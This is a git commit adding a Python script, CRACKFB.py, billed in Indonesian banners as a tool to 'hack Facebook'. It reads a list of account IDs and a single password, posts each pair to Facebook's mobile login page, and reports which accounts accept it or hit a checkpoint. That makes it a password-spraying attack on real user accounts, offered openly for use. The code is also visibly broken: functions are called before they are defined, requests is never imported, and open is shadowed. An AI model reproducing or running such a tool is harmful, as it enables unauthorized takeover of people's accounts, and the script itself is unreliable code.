d76dbdc30b269813ad1f7eb067609c2ab61a012d
RanzTeam <63694989+RanzTeam@users.noreply.github.com>
2020-04-20 19:44:43 +0700

    Add files via upload

---
+++ CRACKFB.py
@@ -0,0 +1,84 @@
+import os
+import sys
+import time
+from termcolor import colored
+
+a = "\033[031m"
+
+os.system('clear')
+print ("======================================")
+print ("AUTHOR : Mr XXXTRI3WSL")
+print ("YOUTUBE: AGUNG ZKYT")
+print ("TEAM   : NCPH - Network Crack")
+print ("LU BURIQ DAN GUA GANS")
+print ("======================================")
+print
+print ("================   ================")
+print ("088219478540          INDONESIA")
+print ("=============      ================")
+time.sleep(2)
+print
+print ("===============================")
+print ("GASKEUN BOSQ OJO LALI WOK WOK")
+print ("===============================")
+print
+print
+print ("===========================")
+print ("1). MEMLULAI HACK FACEBOOK")
+print ("===========================")
+time.sleep(2)
+print ("===========================")
+print ("2).       EXIT")
+print ("===========================")
+time.sleep(3)
+pilih = str(input('[?] pilih : '))
+
+if pilih == "1":
+        os.system('pkg update && pkg upgrade')
+        os.system('pkg install python2')
+        os.system('pkg install git')
+        os.system('pip2 install requests')
+        os.system('pip2 install mechanize')
+        os.system('pip install termcolor')
+
+os.system('clear')
+print ("█████████")
+print ("█▄█████▄█================================")
+print ("█▼▼▼▼▼     Author : Mr XXXTRI3WSL")
+print ("█          Youtube: AGUNG ZKYT")
+print ("█▲▲▲▲▲     Team   : NCPH - Network Crack")
+print ("█████████================================")
+print ("_██____██")
+print
+print
+id = input("Enter ID list : ")
+pw = input("password to  crack : ")
+
+
+try:
+        list(id,pw)
+
+except:
+        exit()
+
+def brute(id,pw):
+        link = "https://m.facebook.com/login.php"
+        data = {"email":id, "pass":pw}
+        r = requests.post(link, data=data)
+        print (r.url)
+        if "m_sess" in r.url:
+                print ("found "+ id +" ~>  " + pw)
+        elif "checkpoint" in r.url:
+                print ("checkpoint "+ id +" ~>  " + pw)
+        else:
+                print ("failed "+ id )
+def list(open,pw):
+        file = open(open, "r").readlines()
+        for i in file:
+                brute(i.strip(),pw)
+
+try:
+        list(id,pw)
+
+except:
+        exit()
